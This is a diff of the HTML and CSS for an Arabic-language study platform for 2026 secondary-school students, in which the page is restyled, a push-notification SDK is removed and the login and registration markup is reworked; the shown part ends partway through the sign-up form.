@@ -1,450 +1,531 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
-    <script>
-      window.OneSignalDeferred = window.OneSignalDeferred || [];
-      OneSignalDeferred.push(async function(OneSignal) {
-        await OneSignal.init({
-          appId: "7e6da62d-7c47-4c0f-93ba-7e6d2189e1b5",
-        });
-      });
-    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>منصة كيمو أكاديمي | مراجعات وامتحانات ثانوية عامة 2026 مجانية</title>
+    <title>منصة كيمو أكاديمي | مراجعات وامتحانات 2026</title>
     <link rel="icon" href="https://raw.githubusercontent.com/ky8694429-oss/kimo-academy/main/logo.png" type="image/png">
     <meta property="og:image" content="https://raw.githubusercontent.com/ky8694429-oss/kimo-academy/main/logo.png">
-
-    <meta name="description" content="أقوى منصة تعليمية مجانية لطلاب الثانوية العامة 2026. ملخصات، امتحانات تفاعلية، ومراجعات نهائية في الفيزياء، الكيمياء، وكل المواد للنظام الجديد.">
-    <meta name="keywords" content="ثانوية عامة 2026, مراجعات مجانية, امتحانات الكترونية, ملخصات فيزياء, كيمو اكاديمي, مراجعة ليلة الامتحان">
-
-    <meta property="og:title" content="كيمو أكاديمي - مراجعات الثانوية العامة 2026">
-    <meta property="og:description" content="كل اللي تحتاجه للثانوية العامة في مكان واحد وببلاش.">
-    <meta property="og:url" content="https://ky8694429-oss.github.io/kimo-academy/">
-    <meta property="og:type" content="website">
-
-    <link rel="canonical" href="https://ky8694429-oss.github.io/kimo-academy/">
-
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
     <style>
         :root {
-            --main-bg: #05070a;
-            --card-bg: #0d1117;
-            --accent: #FF9800;
-            --green: #00c851;
-            --text: #e6edf3;
-            --telegram: #0088cc;
-            --danger: #ff4d4d;
-            --gold: #FFD700;
-            --sidebar-bg: rgba(13, 17, 23, 0.96);
-            --logo-text: #ffffff;
-            --electric: #00f2ff;
+            --bg-main: #070a10;
+            --bg-card: #0f1520;
+            --bg-soft: #162032;
+            --accent: #ff8c00;
+            --accent-2: #00d4ff;
+            --green: #10b981;
+            --danger: #ef4444;
+            --gold: #fbbf24;
+            --text: #f1f5f9;
+            --muted: #94a3b8;
+            --border: #243044;
         }
 
-        body.light-mode {
-            --main-bg: #f0f2f5;
-            --card-bg: #ffffff;
-            --text: #1c1e21;
-            --sidebar-bg: #ffffff;
-            --logo-text: #1c1e21;
+        body.light-theme {
+            --bg-main: #f4f6fa;
+            --bg-card: #ffffff;
+            --bg-soft: #eef2f7;
+            --accent: #ea580c;
+            --accent-2: #0284c7;
+            --green: #059669;
+            --danger: #dc2626;
+            --gold: #d97706;
+            --text: #0f172a;
+            --muted: #475569;
+            --border: #cbd5e1;
         }
 
         * {
             box-sizing: border-box;
-            -webkit-tap-highlight-color: rgba(255, 152, 0, 0.25);
+            -webkit-tap-highlight-color: rgba(255, 140, 0, 0.2);
             touch-action: manipulation;
         }
 
         html, body {
             margin: 0;
             padding: 0;
-            background: var(--main-bg);
+            background: var(--bg-main);
             color: var(--text);
             font-family: 'Cairo', sans-serif;
             min-height: 100vh;
             overflow-x: hidden;
-            scroll-behavior: smooth;
             font-variant-numeric: tabular-nums;
         }
 
-        body.light-mode .card,
-        body.light-mode .admin-stat-card {
-            background: #ffffff;
-            border-color: #d0d7de;
-            color: #1c1e21;
-        }
-
-        body.light-mode input,
-        body.light-mode select,
-        body.light-mode textarea {
-            background: #f6f8fa !important;
-            color: #1c1e21 !important;
-            border-color: #d0d7de !important;
-        }
-
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: var(--main-bg); }
+        ::-webkit-scrollbar { width: 7px; height: 7px; }
+        ::-webkit-scrollbar-track { background: var(--bg-main); }
         ::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 10px; }
 
-        #scroll-progress {
-            position: fixed;
-            top: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(to left, var(--accent), var(--electric));
-            z-index: 100000;
-            width: 0%;
-            transition: width 0.2s ease;
-        }
-
-        .sidebar-toggle-btn {
-            position: fixed;
-            right: 280px;
-            top: 14px;
-            z-index: 10000;
-            background: var(--accent);
-            border: none;
-            width: 36px;
-            height: 36px;
-            border-radius: 8px 0 0 8px;
-            cursor: pointer;
-            transition: right 0.35s ease;
-            box-shadow: 0 2px 10px rgba(255, 152, 0, 0.35);
-            color: #000;
-            font-size: 16px;
-            display: none;
-            align-items: center;
-            justify-content: center;
-        }
-
-        aside.closed + .sidebar-toggle-btn { right: 0; }
-        aside { transition: transform 0.35s ease; transform: translateX(0); }
-        aside.closed { transform: translateX(100%); }
-
-        .logo-master-container {
+        .logo-box {
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 16px;
-            margin: 0 auto;
-            position: relative;
+            padding: 14px;
+            animation: logoPulse 3.2s ease-in-out infinite;
         }
 
-        .logo-main-name {
-            color: var(--logo-text);
-            font-size: 40px;
+        .logo-word {
+            font-size: 36px;
             font-weight: 900;
             position: relative;
+            letter-spacing: 1px;
         }
 
-        .logo-crown-icon {
+        .logo-crown {
             position: absolute;
-            top: -14px;
-            right: -8px;
-            font-size: 20px;
-            color: #FFD700;
+            top: -12px;
+            right: -12px;
+            font-size: 18px;
+            color: var(--gold);
+            animation: crownBob 2.6s ease-in-out infinite;
         }
 
-        #notification-toast {
-            position: fixed;
-            top: -100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--accent);
-            color: #000;
-            padding: 12px 22px;
-            border-radius: 50px;
-            box-shadow: 0 8px 25px rgba(255, 152, 0, 0.35);
-            z-index: 30000;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            transition: top 0.35s ease;
+        @keyframes logoPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
         }
 
-        #notification-toast.show { top: 70px; }
-
-        .btn-accent {
-            background: var(--accent);
-            color: #000;
-            padding: 12px;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            font-weight: bold;
-            width: 100%;
-            font-size: 15px;
-            font-family: 'Cairo', sans-serif;
-            transition: transform 0.15s ease, opacity 0.2s ease;
+        @keyframes crownBob {
+            0%, 100% { transform: translateY(0) rotate(-8deg); }
+            50% { transform: translateY(-4px) rotate(4deg); }
         }
 
-        .btn-accent:hover { opacity: 0.92; }
-        .btn-accent:active { transform: scale(0.98); }
-
-        .news-ticker {
-            position: fixed;
-            top: 60px;
-            left: 0;
-            right: 0;
-            background: var(--accent);
-            color: #000;
-            height: 30px;
-            z-index: 997;
-            display: none;
-            overflow: hidden;
-            font-weight: bold;
-            line-height: 30px;
-            font-size: 13px;
-        }
-
-        .ticker-text {
-            display: inline-block;
-            white-space: nowrap;
-            animation: ticker 25s linear infinite;
-            padding-right: 100%;
-        }
-
-        @keyframes ticker {
-            0% { transform: translateX(100%); }
-            100% { transform: translateX(-100%); }
-        }
-
-        .top-tools {
+        .top-bar {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             height: 60px;
+            background: var(--bg-card);
+            border-bottom: 1px solid var(--border);
             display: none;
             align-items: center;
-            justify-content: flex-end;
+            justify-content: space-between;
             padding: 0 16px;
-            gap: 10px;
-            z-index: 998;
-            background: var(--sidebar-bg);
-            backdrop-filter: blur(8px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            z-index: 900;
         }
 
-        .tool-btn {
-            background: var(--card-bg);
-            border: 1px solid var(--accent);
-            color: var(--accent);
-            width: 38px;
-            height: 38px;
-            border-radius: 10px;
+        .top-actions {
             display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .icon-btn {
+            background: var(--bg-soft);
+            border: 1px solid var(--border);
+            color: var(--text);
+            height: 38px;
+            min-width: 38px;
+            padding: 0 10px;
+            border-radius: 10px;
+            cursor: pointer;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
-            transition: 0.2s;
-            font-size: 15px;
-        }
-
-        aside {
-            width: 280px;
-            background: var(--sidebar-bg);
-            backdrop-filter: blur(10px);
-            border-left: 1px solid #30363d;
-            display: none;
-            flex-direction: column;
-            position: fixed;
-            right: 0;
-            top: 0;
-            height: 100vh;
-            z-index: 9999;
-            overflow-y: auto;
-        }
-
-        .nav-link {
-            padding: 15px 22px;
-            cursor: pointer;
-            color: #8b949e;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            transition: 0.2s;
-            border-right: 4px solid transparent;
-            font-size: 16px;
+            gap: 6px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 13px;
             font-weight: 700;
         }
 
-        .nav-link:hover, .nav-link.active {
+        .icon-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+        aside {
+            width: 265px;
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--bg-card);
+            border-left: 1px solid var(--border);
+            display: none;
+            flex-direction: column;
+            z-index: 950;
+            overflow-y: auto;
+            transition: transform 0.25s ease;
+        }
+
+        aside.closed { transform: translateX(100%); }
+
+        .sidebar-toggle {
+            position: fixed;
+            top: 72px;
+            right: 265px;
+            width: 34px;
+            height: 34px;
+            border-radius: 8px 0 0 8px;
+            border: 1px solid var(--border);
+            background: var(--accent);
+            color: #000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 951;
+            transition: right 0.25s ease;
+        }
+
+        aside.closed + .sidebar-toggle { right: 0; }
+
+        .nav-item {
+            padding: 13px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--muted);
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 15px;
+            border-right: 3px solid transparent;
+        }
+
+        .nav-item:hover, .nav-item.active {
             color: var(--accent);
-            background: rgba(255, 152, 0, 0.08);
+            background: rgba(255, 140, 0, 0.08);
             border-right-color: var(--accent);
         }
 
         main {
-            flex: 1;
-            padding: 25px;
             display: none;
-            padding-top: 105px;
-            padding-bottom: 120px;
-            margin-right: 280px;
-            transition: margin-right 0.35s ease;
+            padding: 78px 22px 115px;
+            margin-right: 265px;
+            transition: margin-right 0.25s ease;
         }
 
-        main.full-width { margin-right: 0; }
-        .page { display: none; animation: fadeIn 0.3s ease; }
+        main.expanded { margin-right: 0; }
+
+        .page { display: none; }
         .page.active { display: block; }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(6px); }
-            to { opacity: 1; transform: translateY(0); }
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 18px;
+            margin-bottom: 16px;
         }
 
-        .subject-card {
-            height: 150px;
+        .grid-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 16px;
+        }
+
+        .btn {
+            background: var(--accent);
+            color: #000;
+            border: none;
+            border-radius: 11px;
+            padding: 11px 16px;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 800;
+            font-size: 14px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn:hover { filter: brightness(1.06); }
+        .btn-full { width: 100%; }
+        .btn-soft { background: var(--bg-soft); color: var(--text); border: 1px solid var(--border); }
+        .btn-green { background: var(--green); color: #fff; }
+        .btn-danger { background: var(--danger); color: #fff; }
+        .btn-blue { background: var(--accent-2); color: #000; }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 11px 13px;
+            border-radius: 11px;
+            border: 1px solid var(--border);
+            background: var(--bg-soft);
+            color: var(--text);
+            font-family: 'Cairo', sans-serif;
+            font-size: 14px;
+            outline: none;
+        }
+
+        input:focus, select:focus, textarea:focus { border-color: var(--accent); }
+
+        .subject-tile {
+            height: 140px;
+            border-radius: 16px;
             background-size: cover;
             background-position: center;
-            border-radius: 18px;
+            position: relative;
+            overflow: hidden;
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
-            transition: transform 0.2s ease, border-color 0.2s ease;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.12);
+            border: 1px solid var(--border);
         }
 
-        .subject-card::before {
+        .subject-tile::before {
             content: "";
             position: absolute;
             inset: 0;
-            background: rgba(0, 0, 0, 0.62);
-            z-index: 1;
+            background: rgba(0, 0, 0, 0.58);
         }
 
-        .subject-card h3 {
+        .subject-tile h3 {
             position: relative;
-            z-index: 2;
+            z-index: 1;
             color: #fff;
             margin: 0;
-            font-size: 20px;
-            text-shadow: 0 2px 8px #000;
-        }
-
-        .subject-card:hover {
-            transform: translateY(-3px);
-            border-color: var(--accent);
-        }
-
-        .card {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 18px;
-            border: 1px solid #30363d;
-            text-align: center;
-            position: relative;
-            margin-bottom: 15px;
+            font-size: 19px;
         }
 
         .lesson-thumb {
             width: 100%;
-            height: 140px;
+            height: 135px;
+            border-radius: 10px;
             background-size: cover;
             background-position: center;
-            border-radius: 10px;
-            margin-bottom: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            margin-bottom: 10px;
+            border: 1px solid var(--border);
         }
 
-        #video-player-overlay {
+        /* البروفايل والشارات */
+        .avatar-circle {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: var(--bg-soft);
+            border: 2px solid var(--accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            flex-shrink: 0;
+            font-size: 24px;
+            color: var(--accent);
+        }
+
+        .avatar-circle img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .verified-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: #1d9bf0;
+            color: #fff;
+            font-size: 11px;
+            margin-right: 4px;
+            vertical-align: middle;
+        }
+
+        /* الشات العام ووضع ملء الشاشة */
+        .chat-wrapper {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 14px;
+            display: flex;
+            flex-direction: column;
+            height: 520px;
+        }
+
+        .chat-wrapper.fullscreen-mode {
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.96);
-            z-index: 15000;
+            width: 100vw;
+            height: 100vh;
+            border-radius: 0;
+            z-index: 20000;
+            padding: 14px;
+        }
+
+        .chat-header-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 10px;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .chat-stream {
+            flex: 1;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            padding: 6px;
+            background: var(--bg-soft);
+            border-radius: 12px;
+            margin-bottom: 10px;
+        }
+
+        .msg-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            max-width: 90%;
+        }
+
+        .msg-row.mine {
+            align-self: flex-end;
+            flex-direction: row-reverse;
+        }
+
+        .msg-avatar-sm {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 1px solid var(--accent);
+            background: var(--bg-card);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 14px;
+            color: var(--accent);
+            overflow: hidden;
+        }
+
+        .msg-body {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 9px 12px;
+            font-size: 14px;
+            line-height: 1.5;
+            word-break: break-word;
+        }
+
+        .msg-row.mine .msg-body {
+            background: rgba(255, 140, 0, 0.14);
+            border-color: var(--accent);
+        }
+
+        .msg-meta {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 4px;
+            font-size: 12px;
+        }
+
+        .chat-composer {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .chat-composer input[type="text"] {
+            flex: 1;
+            min-width: 150px;
+        }
+
+        /* شات خاص ثنائي */
+        .dm-overlay {
+            position: fixed;
+            inset: 0;
+            background: var(--bg-main);
+            z-index: 25000;
+            display: none;
+            flex-direction: column;
+            padding: 14px;
+        }
+
+        .dm-messages {
+            flex: 1;
+            overflow-y: auto;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 10px 0;
+        }
+
+        .mobile-dock {
+            position: fixed;
+            bottom: 38px;
+            left: 0;
+            right: 0;
+            background: var(--bg-card);
+            border-top: 1px solid var(--border);
+            display: none;
+            justify-content: space-around;
+            padding: 8px 4px;
+            z-index: 920;
+        }
+
+        .mobile-dock button {
+            background: none;
+            border: none;
+            color: var(--muted);
+            font-family: 'Cairo', sans-serif;
+            font-size: 11px;
+            font-weight: 700;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 3px;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 8px;
+        }
+
+        .mobile-dock button.active {
+            color: var(--accent);
+            background: rgba(255, 140, 0, 0.1);
+        }
+
+        .floating-dm-btn {
+            position: fixed;
+            bottom: 96px;
+            left: 16px;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: var(--accent-2);
+            color: #000;
+            border: none;
+            font-size: 20px;
+            box-shadow: 0 6px 18px rgba(0, 212, 255, 0.35);
+            cursor: pointer;
             display: none;
             align-items: center;
             justify-content: center;
-            flex-direction: column;
-            padding: 15px;
-        }
-
-        .video-container {
-            width: 100%;
-            max-width: 1000px;
-            aspect-ratio: 16/9;
-            background: #000;
-            border: 2px solid var(--accent);
-            border-radius: 12px;
-            overflow: hidden;
-            position: relative;
+            z-index: 930;
         }
 
         footer {
             position: fixed;
             bottom: 0;
             left: 0;
-            width: 100%;
-            background: #010409;
-            color: #fff;
+            right: 0;
+            background: var(--bg-card);
+            border-top: 1px solid var(--border);
             text-align: center;
-            padding: 12px 0;
-            font-size: 13px;
-            border-top: 2px solid var(--accent);
-            z-index: 1000;
-        }
-
-        #chat-messages {
-            height: 380px;
-            overflow-y: auto;
-            background: rgba(0, 0, 0, 0.35);
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid #30363d;
-            margin-bottom: 12px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .msg-bubble {
-            max-width: 82%;
-            padding: 10px 14px;
-            border-radius: 14px;
-            font-size: 14px;
-            line-height: 1.5;
-            color: #fff;
-            word-break: break-word;
-        }
-
-        .msg-student {
-            align-self: flex-start;
-            background: #202c33;
-            border-bottom-right-radius: 4px;
-            text-align: right;
-        }
-
-        .msg-me {
-            align-self: flex-end;
-            background: #005c4b;
-            border-bottom-left-radius: 4px;
-            text-align: right;
-        }
-
-        .msg-bubble b {
-            display: block;
+            padding: 9px;
             font-size: 12px;
-            margin-bottom: 4px;
-            color: var(--accent);
-        }
-
-        .msg-bubble small {
-            display: block;
-            font-size: 10px;
-            opacity: 0.7;
-            margin-top: 4px;
-            text-align: left;
+            color: var(--muted);
+            z-index: 900;
         }
 
         .en-num {
@@ -453,535 +534,313 @@
             display: inline-block;
         }
 
-        .student-row {
-            display: grid;
-            grid-template-columns: 1.2fr 1fr 0.6fr 1fr;
-            align-items: center;
-            padding: 10px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-            gap: 8px;
-        }
-
-        .admin-stat-card {
-            background: var(--card-bg);
-            padding: 16px;
-            border-radius: 15px;
-            border: 1px solid #30363d;
-            text-align: center;
-        }
-
-        .content-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 16px;
-        }
-
-        .admin-controls {
-            display: flex;
-            gap: 6px;
-            margin-top: 10px;
-            justify-content: center;
-        }
-
-        .btn-pin {
-            background: var(--gold);
-            color: #000;
-            border: none;
-            padding: 6px 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: bold;
-        }
-
-        .btn-del {
-            background: var(--danger);
-            color: #fff;
-            border: none;
-            padding: 6px 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 12px;
-        }
-
-        .kimo-id-card {
-            background: var(--card-bg);
-            border: 1px solid rgba(255, 152, 0, 0.35);
-            border-radius: 18px;
-            padding: 18px;
-            margin-bottom: 18px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-
-        .id-avatar-box {
-            position: relative;
-            width: 68px;
-            height: 68px;
-            flex-shrink: 0;
-        }
-
-        .id-avatar {
-            width: 68px;
-            height: 68px;
-            border-radius: 50%;
-            border: 2px solid var(--accent);
-            background: #161b22;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 26px;
-            color: var(--accent);
-            overflow: hidden;
-            object-fit: cover;
-        }
-
-        .avatar-upload-btn {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 26px;
-            height: 26px;
-            border-radius: 50%;
-            background: var(--accent);
-            color: #000;
-            border: none;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
-        }
-
-        .id-badge {
-            background: var(--accent);
-            color: #000;
-            font-size: 11px;
-            padding: 2px 10px;
-            border-radius: 10px;
-            font-weight: bold;
-            display: inline-block;
-            margin-top: 4px;
-        }
-
-        .stats-container {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-bottom: 12px;
-        }
-
-        .stat-box {
-            background: rgba(255, 255, 255, 0.03);
-            padding: 12px;
-            border-radius: 12px;
-            text-align: center;
-            border: 1px solid #30363d;
-        }
-
-        .xp-container {
-            background: #161b22;
-            height: 8px;
-            border-radius: 10px;
-            overflow: hidden;
-            border: 1px solid #30363d;
-            margin-bottom: 8px;
-        }
-
-        .xp-bar {
-            height: 100%;
-            width: 65%;
-            background: linear-gradient(90deg, var(--accent), #ffeb3b);
-        }
-
-        .mobile-nav {
-            position: fixed;
-            bottom: 42px;
-            left: 0;
-            right: 0;
-            background: var(--sidebar-bg);
-            display: none;
-            justify-content: space-around;
-            align-items: center;
-            padding: 10px 4px;
-            border-top: 1px solid var(--accent);
-            z-index: 1001;
-        }
-
-        .mobile-nav div {
-            font-size: 18px;
-            color: #8b949e;
-            padding: 6px 10px;
-            cursor: pointer;
-            border-radius: 8px;
-        }
-
-        .mobile-nav div.active-mob {
-            color: var(--accent);
-            background: rgba(255, 152, 0, 0.12);
-        }
-
-        .quick-fab {
-            position: fixed;
-            bottom: 96px;
-            left: 16px;
-            width: 46px;
-            height: 46px;
-            border-radius: 50%;
-            background: var(--accent);
-            color: #000;
-            border: none;
-            font-size: 18px;
-            cursor: pointer;
-            z-index: 9998;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 14px rgba(255, 152, 0, 0.35);
-        }
-
-        .private-chat-fab {
-            position: fixed;
-            bottom: 150px;
-            left: 16px;
-            width: 46px;
-            height: 46px;
-            border-radius: 50%;
-            background: var(--telegram);
-            color: #fff;
-            border: none;
-            font-size: 18px;
-            cursor: pointer;
-            z-index: 9998;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 14px rgba(0, 136, 204, 0.35);
-        }
-
-        .modal-backdrop-custom {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 200000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-        }
-
-        .modal-box-custom {
-            background: var(--card-bg);
-            border: 2px solid var(--accent);
-            border-radius: 20px;
-            padding: 24px;
-            width: 100%;
-            max-width: 440px;
-            text-align: center;
-        }
-
         @media (max-width: 768px) {
-            aside { display: none !important; }
-            .sidebar-toggle-btn { display: none !important; }
-            main {
-                padding: 14px;
-                padding-top: 98px;
-                padding-bottom: 120px;
-                margin-right: 0 !important;
-            }
-            .mobile-nav.logged-in { display: flex; }
-            .quick-fab.logged-in,
-            .private-chat-fab.logged-in { display: flex; }
+            aside, .sidebar-toggle { display: none !important; }
+            main { margin-right: 0 !important; padding: 72px 14px 120px; }
+            .mobile-dock.visible { display: flex; }
+            .floating-dm-btn.visible { display: flex; }
         }
     </style>
 </head>
 <body>
 
-    <div id="scroll-progress"></div>
-
-    <div id="notification-toast">
-        <i class="fas fa-bell"></i>
-        <span id="notif-text">حاجة جديدة انضافت للمنصة!</span>
-    </div>
-
-    <div id="top-bar" class="top-tools">
-        <div id="admin-live-info" style="display:none; margin-left: auto; color: var(--accent); font-weight: bold; font-size: 13px;">
-            <i class="fas fa-users"></i> الطلاب: <span id="total-students-count" class="en-num">0</span>
+    <div id="top-bar" class="top-bar">
+        <div style="display:flex; align-items:center; gap:10px;">
+            <strong style="color:var(--accent); font-size:16px;">كيمو أكاديمي</strong>
+            <span id="admin-count-badge" style="display:none; font-size:12px; color:var(--accent-2);" class="en-num"></span>
         </div>
-        <button class="tool-btn" title="البحث السريع" onclick="openKimoSearch()"><i class="fas fa-search"></i></button>
-        <button class="tool-btn" title="تغيير صورة البروفايل" onclick="document.getElementById('pfp-file-input').click()"><i class="fas fa-camera"></i></button>
-        <button class="tool-btn" title="تغيير المظهر" onclick="toggleTheme()"><i id="theme-icon" class="fas fa-moon"></i></button>
-        <button class="tool-btn" title="تسجيل الخروج" onclick="logout()"><i class="fas fa-sign-out-alt"></i></button>
-    </div>
-
-    <input type="file" id="pfp-file-input" accept="image/*" style="display:none;" onchange="updateProfilePictureFromGallery(this)">
-
-    <div id="news-bar" class="news-ticker">
-        <div class="ticker-text" id="ticker-content">أهلاً بك في منصة كيمو أكاديمي - مراجعات وامتحانات ثانوية عامة 2026</div>
-    </div>
-
-    <div id="video-player-overlay">
-        <div style="width: 100%; max-width: 1000px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
-            <span id="video-title-label" style="color: var(--accent); font-weight: bold; font-size: 15px;"></span>
-            <button class="btn-accent" style="width: auto; padding: 6px 18px;" onclick="closeVideo()">إغلاق ×</button>
-        </div>
-        <div class="video-container" id="video-frame-container"></div>
-    </div>
-
-    <div id="login-gate">
-        <div class="gate-box" style="max-width: 420px; margin: 35px auto; padding: 28px; background: var(--card-bg); border-radius: 20px; text-align: center; border: 1px solid var(--accent); box-shadow: 0 10px 30px rgba(0,0,0,0.35);">
-            <div class="logo-master-container">
-                <div class="logo-icon-box" style="position: relative;">
-                    <svg viewBox="0 0 24 24" style="width:76px; filter: drop-shadow(0 0 12px #FF9800);">
-                        <path d="M9 21H15M9 18H15M10 15H14M12 3C9.23858 3 7 5.23858 7 8C7 9.58581 7.73444 11.0004 8.88563 11.9248C10.1944 12.9757 11 14.192 11 15.5V16H13V15.5C13 14.192 13.8056 12.9757 15.1144 11.9248C16.2656 11.0004 17 9.58581 17 8C17 5.23858 14.7614 3 12 3Z" stroke="#FF9800" stroke-width="2" fill="none"/>
-                    </svg>
-                    <span style="position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); color: #fff; font-size: 30px; font-weight: 900;">K</span>
-                </div>
-                <div class="logo-text-box">
-                    <div class="logo-main-name">KAREEM<span class="logo-crown-icon">👑</span></div>
-                    <span style="color: #FF9800; letter-spacing: 3px; font-size: 12px; font-weight: bold;">ACADEMY 2026</span>
-                </div>
-            </div>
-
-            <h3 id="gate-title" style="margin-bottom: 18px; color: var(--accent);">تسجيل الدخول</h3>
-
-            <div id="step-1">
-                <input type="tel" id="std-phone" class="en-num" placeholder="رقم الموبايل (مثال: 010xxxxxxxx)" style="width:100%; padding:12px; margin-bottom:14px; border-radius:10px; border:1px solid #30363d; background:#000; color:#fff; text-align:right;">
-                <button class="btn-accent" onclick="identifyStudent()">التالي</button>
-            </div>
-
-            <div id="step-login" style="display:none;">
-                <p id="welcome-back" style="font-size: 14px; margin-bottom: 10px;"></p>
-                <input type="password" id="std-pass" placeholder="أدخل كلمة المرور" style="width:100%; padding:12px; margin-bottom:14px; border-radius:10px; border:1px solid #30363d; background:#000; color:#fff;">
-                <button class="btn-accent" onclick="verifyPassword()">دخول 🚀</button>
-                <p style="margin-top:14px; font-size:12px; color:var(--accent); cursor:pointer;" onclick="showForgetPassword()">نسيت كلمة المرور؟</p>
-                <p style="margin-top:8px; font-size:12px; color:#8b949e; cursor:pointer;" onclick="backToPhoneStep()">تغيير رقم الموبايل</p>
-            </div>
-
-            <div id="step-register" style="display:none;">
-                <p style="font-size: 13px; color: var(--green); margin-bottom: 10px;">أهلاً بك! أنشئ حسابك لبدء المذاكرة:</p>
-                <input type="text" id="reg-name" placeholder="الاسم الثلاثي" style="width:100%; padding:12px; margin-bottom:10px; border-radius:10px; border:1px solid #30363d; background:#000; color:#fff;">
-                <input type="password" id="reg-pass" placeholder="إنشاء كلمة مرور (4 أحرف أو أرقام على الأقل)" style="width:100%; padding:12px; margin-bottom:10px; border-radius:10px; border:1px solid #30363d; background:#000; color:#fff;">
-                <select id="reg-question" style="width:100%; padding:12px; margin-bottom:10px; border-radius:10px; border:1px solid #30363d; background:#000; color:#fff;">
-                    <option value="">اختر سؤال أمان (للطوارئ)</option>
